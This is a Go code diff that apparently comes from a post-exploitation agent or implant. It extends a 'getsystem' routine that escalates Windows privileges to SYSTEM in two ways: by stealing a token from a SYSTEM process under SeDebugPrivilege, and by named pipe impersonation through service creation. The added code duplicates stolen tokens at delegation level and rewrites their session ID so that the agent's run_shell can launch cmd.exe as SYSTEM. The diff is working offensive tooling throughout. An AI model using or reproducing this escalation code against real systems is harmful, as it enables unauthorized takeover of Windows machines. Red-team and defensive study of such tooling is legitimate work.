@@ -24,6 +24,8 @@ var (
 	procImpersonateNamedPipeClient = windows.NewLazySystemDLL("advapi32.dll").NewProc("ImpersonateNamedPipeClient")
 	procOpenThreadToken            = windows.NewLazySystemDLL("advapi32.dll").NewProc("OpenThreadToken")
 	procSetThreadToken             = windows.NewLazySystemDLL("advapi32.dll").NewProc("SetThreadToken")
+	procGetTokenInformation        = windows.NewLazySystemDLL("advapi32.dll").NewProc("GetTokenInformation")
+	procSetTokenInformation        = windows.NewLazySystemDLL("advapi32.dll").NewProc("SetTokenInformation")
 )
 
 // enablePrivilege enables a named privilege on the current process token.
@@ -242,18 +244,50 @@ func gsT2NamedPipeService() (windows.Token, string, error) {
 	return tok, fmt.Sprintf("T2 (named pipe + service '%s' → %s)", svcName, owner), nil
 }
 
+// normalizeTokenSession adjusts tok's session ID to match the calling process
+// so that cmd.exe can initialise user32.dll.  A cross-session token (e.g.
+// winlogon = Session 1 while the agent is Session 0) causes STATUS_DLL_INIT_FAILED.
+// Requires SeTcbPrivilege on the calling thread (present while impersonating SYSTEM).
+func normalizeTokenSession(tok windows.Token) {
+	const tokenSessionId = 12 // TOKEN_INFORMATION_CLASS::TokenSessionId
+	var selfTok windows.Token
+	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &selfTok); err != nil {
+		return
+	}
+	defer selfTok.Close()
+	var sessionId uint32
+	var retLen uint32
+	procGetTokenInformation.Call(uintptr(selfTok), tokenSessionId,
+		uintptr(unsafe.Pointer(&sessionId)), 4, uintptr(unsafe.Pointer(&retLen)))
+	procSetTokenInformation.Call(uintptr(tok), tokenSessionId,
+		uintptr(unsafe.Pointer(&sessionId)), 4)
+}
+
 // storePrimaryToken duplicates tok as a primary token and stores it in
 // gSystemToken so run_shell can use CreateProcessWithTokenW on any thread.
-func storePrimaryToken(tok windows.Token) {
-	var hPrim windows.Token
-	if err := windows.DuplicateTokenEx(tok, windows.TOKEN_ALL_ACCESS, nil,
-		windows.SecurityImpersonation, windows.TokenPrimary, &hPrim); err == nil {
+func storePrimaryToken(tok windows.Token) bool {
+	// Delegation is the strongest token level and is accepted by more
+	// CreateProcess* paths.  Fall back to impersonation for tokens that cannot
+	// be duplicated at delegation level (common with filtered local-admin
+	// tokens).
+	for _, level := range []uint32{
+		windows.SecurityDelegation,
+		windows.SecurityImpersonation,
+	} {
+		var hPrim windows.Token
+		if err := windows.DuplicateTokenEx(tok, windows.TOKEN_ALL_ACCESS, nil,
+			level, windows.TokenPrimary, &hPrim); err != nil {
+			continue
+		}
+		normalizeTokenSession(hPrim)
 		old := gSystemToken
 		gSystemToken = windows.Handle(hPrim)
 		if old != 0 {
 			windows.CloseHandle(old)
 		}
+		return true
 	}
+	return false
 }
 
 // GetSystem attempts privilege escalation to SYSTEM using multiple techniques.
@@ -264,22 +298,32 @@ func GetSystem() (string, bool) {
 	sb.WriteString("[*] T1: SeDebugPrivilege + token steal from SYSTEM process…\n")
 	tok1, desc1, err1 := gsT1TokenSteal()
 	if err1 == nil {
-		storePrimaryToken(tok1)
+		stored := storePrimaryToken(tok1)
 		windows.CloseHandle(windows.Handle(tok1))
-		sb.WriteString("[+] SYSTEM — " + desc1 + "\n")
-		return sb.String(), true
+		if stored {
+			sb.WriteString("[+] SYSTEM — " + desc1 + "\n")
+			return sb.String(), true
+		}
+		sb.WriteString("    [-] primary SYSTEM token duplication failed\n")
 	}
-	sb.WriteString("    [-] " + err1.Error() + "\n")
+	if err1 != nil {
+		sb.WriteString("    [-] " + err1.Error() + "\n")
+	}
 
 	sb.WriteString("[*] T2: Named pipe impersonation via service creation…\n")
 	tok2, desc2, err2 := gsT2NamedPipeService()
 	if err2 == nil {
-		storePrimaryToken(tok2)
+		stored := storePrimaryToken(tok2)
 		windows.CloseHandle(windows.Handle(tok2))
-		sb.WriteString("[+] SYSTEM — " + desc2 + "\n")
-		return sb.String(), true
+		if stored {
+			sb.WriteString("[+] SYSTEM — " + desc2 + "\n")
+			return sb.String(), true
+		}
+		sb.WriteString("    [-] primary SYSTEM token duplication failed\n")
 	}
-	sb.WriteString("    [-] " + err2.Error() + "\n")
+	if err2 != nil {
+		sb.WriteString("    [-] " + err2.Error() + "\n")
+	}
 
 	sb.WriteString("[!] getsystem failed — need SeDebugPrivilege or local admin (to create services)\n")
 	return sb.String(), false
